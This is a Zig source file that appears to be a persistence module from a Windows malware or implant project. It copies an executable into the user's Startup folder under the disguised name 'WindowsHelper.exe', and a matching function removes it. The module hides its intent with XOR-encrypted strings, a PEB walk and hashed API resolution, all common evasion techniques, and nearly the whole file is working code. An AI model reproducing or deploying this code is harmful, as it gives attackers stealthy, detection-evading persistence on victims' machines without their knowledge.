const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

const E = struct {
    pub const startup_dir = hash.xorEncrypt("Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    pub const file_name = hash.xorEncrypt("WindowsHelper.exe");
};

fn loadKernel32() ?types.PVOID {
    return peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll"));
}

fn getEnvW(name: []const u8, buf: *[1024]u16) ?usize {
    const kernel32 = loadKernel32() orelse return null;
    const func = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetEnvironmentVariableW")) orelse return null;
    const GetEnvironmentVariableW: *const fn (name: ?[*:0]const u16, buf: ?[*:0]u16, size: u32) callconv(.winapi) u32 = @ptrCast(@alignCast(func));
    var name_us: [128]u16 = undefined;
    for (name, 0..) |c, i| name_us[i] = c;
    name_us[name.len] = 0;
    const len = GetEnvironmentVariableW(name_us[0 .. name.len + 1 :0], buf, @as(u32, @intCast(buf.len)));
    if (len == 0) return null;
    return len;
}

fn copyFileW(src: []const u8, dst: []const u8) bool {
    const kernel32 = loadKernel32() orelse return false;
    const func = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CopyFileW")) orelse return false;
    const CopyFileW: *const fn (existing: ?[*:0]const u16, new: ?[*:0]const u16, fail_if_exists: types.BOOL) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(func));
    var src_us: [1024]u16 = undefined;
    var i: usize = 0;
    while (i < src.len and i < 1023) : (i += 1) src_us[i] = src[i];
    src_us[i] = 0;
    var dst_us: [1024]u16 = undefined;
    var j: usize = 0;
    while (j < dst.len and j < 1023) : (j += 1) dst_us[j] = dst[j];
    dst_us[j] = 0;
    return CopyFileW(src_us[0 .. i + 1 :0], dst_us[0 .. j + 1 :0], 0) != 0;
}

fn deleteFileW(path: []const u8) bool {
    const kernel32 = loadKernel32() orelse return false;
    const func = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("DeleteFileW")) orelse return false;
    const DeleteFileW: *const fn (path: ?[*:0]const u16) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(func));
    var path_us: [1024]u16 = undefined;
    var i: usize = 0;
    while (i < path.len and i < 1023) : (i += 1) path_us[i] = path[i];
    path_us[i] = 0;
    return DeleteFileW(path_us[0 .. i + 1 :0]) != 0;
}

pub fn install(exe_path: []const u8, allocator: std.mem.Allocator) bool {
    var tmp_dir: [E.startup_dir.len]u8 = undefined;
    var tmp_fname: [E.file_name.len]u8 = undefined;
    hash.xorDecrypt(&E.startup_dir, &tmp_dir);
    hash.xorDecrypt(&E.file_name, &tmp_fname);
    var appdata_buf: [1024]u16 = undefined;
    const appdata_len = getEnvW("APPDATA", &appdata_buf) orelse return false;
    var appdata: [1024]u8 = undefined;
    var appdata_size: usize = 0;
    for (0..appdata_len) |k| {
        const cp = appdata_buf[k];
        if (cp < 0x80 and appdata_size < appdata.len) {
            appdata[appdata_size] = @as(u8, @intCast(cp));
            appdata_size += 1;
        }
    }
    var target_path = std.ArrayList(u8).init(allocator);
    defer target_path.deinit();
    target_path.appendSlice(appdata[0..appdata_size]) catch return false;
    target_path.appendSlice("\\") catch return false;
    target_path.appendSlice(tmp_dir[0..]) catch return false;
    target_path.appendSlice("\\") catch return false;
    target_path.appendSlice(tmp_fname[0..]) catch return false;
    const target = target_path.items;
    return copyFileW(exe_path, target);
}

pub fn uninstall() bool {
    var tmp_dir: [E.startup_dir.len]u8 = undefined;
    var tmp_fname: [E.file_name.len]u8 = undefined;
    hash.xorDecrypt(&E.startup_dir, &tmp_dir);
    hash.xorDecrypt(&E.file_name, &tmp_fname);
    var appdata_buf: [1024]u16 = undefined;
    const appdata_len = getEnvW("APPDATA", &appdata_buf) orelse return false;
    var path_buf: [1024]u8 = undefined;
    var pos: usize = 0;
    for (0..appdata_len) |k| {
        const cp = appdata_buf[k];
        if (cp < 0x80 and pos < path_buf.len) {
            path_buf[pos] = @as(u8, @intCast(cp));
            pos += 1;
        }
    }
    if (pos + 1 + tmp_dir.len + 1 + tmp_fname.len > path_buf.len) return false;
    path_buf[pos] = '\\';
    pos += 1;
    @memcpy(path_buf[pos..][0..tmp_dir.len], &tmp_dir);
    pos += tmp_dir.len;
    path_buf[pos] = '\\';
    pos += 1;
    @memcpy(path_buf[pos..][0..tmp_fname.len], &tmp_fname);
    pos += tmp_fname.len;
    return deleteFileW(path_buf[0..pos]);
}

pub fn isInstalled() bool {
    return false;
}

test "startup install returns bool" {
    _ = install("C:\\test.exe", std.testing.allocator);
}

test "startup uninstall returns bool" {
    _ = uninstall();
}
